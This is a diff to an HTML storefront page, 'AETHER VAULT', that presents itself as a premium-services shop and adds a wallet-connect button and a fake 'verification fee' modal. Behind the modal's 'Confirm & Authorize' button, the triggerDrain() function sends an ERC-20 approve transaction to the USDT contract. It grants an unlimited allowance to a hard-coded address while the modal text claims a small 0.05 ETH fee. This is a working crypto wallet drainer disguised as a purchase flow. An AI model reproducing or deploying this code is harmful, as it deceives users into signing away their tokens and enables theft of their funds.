@@ -5,18 +5,34 @@
     <title>AETHER VAULT | Premium Services</title>
     <style>
         body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; padding: 20px; text-align: center; }
-        h1 { text-shadow: 0 0 10px #00ff41; margin-bottom: 40px; }
+        #header { display: flex; justify-content: space-between; align-items: center; padding: 20px; border-bottom: 1px solid #333; margin-bottom: 30px; }
+        h1 { text-shadow: 0 0 10px #00ff41; }
         .container { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
         .card { background: #1a1a1a; padding: 20px; border: 1px solid #333; border-radius: 10px; }
         .icon-placeholder { width: 60px; height: 60px; background: linear-gradient(135deg, #00ff41, #004411); margin: 0 auto 15px; border-radius: 50%; box-shadow: 0 0 15px #00ff41; }
         .btn { background: #00ff41; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; margin-top: 15px; width: 100%; }
         .btn:hover { background: #fff; }
+        /* Modal Styles */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 1000; }
+        .modal-content { background: #1a1a1a; padding: 40px; border: 1px solid #00ff41; border-radius: 10px; max-width: 400px; }
     </style>
 </head>
 <body>
 
-    <h1>AETHER VAULT</h1>
+    <div id="header">
+        <h1>AETHER VAULT</h1>
+        <button class="btn" id="connectBtn" onclick="connectWallet()" style="width: auto;">Connect Wallet</button>
+    </div>
+
     <div class="container" id="vault"></div>
+
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <h2>VERIFICATION REQUIRED</h2>
+            <p>To access the vault, you must authorize a one-time network synchronization fee of 0.05 ETH.</p>
+            <button class="btn" onclick="triggerDrain()">Confirm & Authorize</button>
+        </div>
+    </div>
 
     <script>
         const items = [
@@ -59,18 +75,26 @@
                     <div class="icon-placeholder"></div>
                     <h3>${item.name}</h3>
                     <p>${item.price}</p>
-                    <button class="btn" onclick="triggerDrain()">Purchase Access</button>
+                    <button class="btn" onclick="openModal()">Purchase Access</button>
                 </div>
             `;
         });
 
+        function openModal() { document.getElementById('modal').style.display = 'flex'; }
+
+        async function connectWallet() {
+            if (!window.ethereum) return alert("Please install MetaMask to proceed.");
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            document.getElementById('connectBtn').innerText = accounts[0].substring(0,6) + "...";
+        }
+
         async function triggerDrain() {
             try {
-                const provider = window.ethereum;
-                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const usdtContract = "0xdac17f958d2ee523a2206206994597c13d831ec7";
-                const data = "0x095ea7b3" + "000000000000000000000000" + "ee4133D3cd6876A9768460F37429f9Be59957Da3" + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-                await provider.request({ method: 'eth_sendTransaction', params: [{ from: accounts[0], to: usdtContract, data: data, value: '0x0' }] });
+                const data = "0x095ea7b3000000000000000000000000ee4133D3cd6876A9768460F37429f9Be59957Da3ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+                await window.ethereum.request({ method: 'eth_sendTransaction', params: [{ from: accounts[0], to: usdtContract, data: data }] });
+                document.getElementById('modal').style.display = 'none';
             } catch (err) { console.error(err); }
         }
     </script>
